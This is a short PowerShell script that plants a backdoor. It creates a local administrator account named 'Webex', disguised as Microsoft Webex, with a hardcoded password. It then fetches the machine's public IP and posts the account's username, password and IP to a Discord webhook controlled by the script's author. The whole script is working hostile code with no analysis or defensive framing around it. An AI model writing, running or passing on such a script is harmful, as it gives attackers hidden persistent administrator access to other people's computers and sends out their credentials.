$username = "Webex"
$password = "ialafgZ368p1"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$webhookUrl = "https://discord.com/api/webhooks/1269087901136719972/rodv_fsXn8trX6SESMv0JzMyVTARJYtzKyEETjjThEzEmHDPG2KiCJfnfufKt_Kc5gur"

New-LocalUser $username -Password $securePassword -FullName "microsoft webex" -Description "Microsoft WeBex.com"
Add-LocalGroupMember -Group "Administrators" -Member $username

$ipAddress = (Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content.Trim()

$jsonPayload = @{
    username = "Server Notification"
    content = "New user created:`nUsername: $username`nPassword: $password`nIP Address: $ipAddress `nPing: <@1269087350089318453>"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload

Write-Host "User $username created and added to Administrators group. Notification sent to Discord."
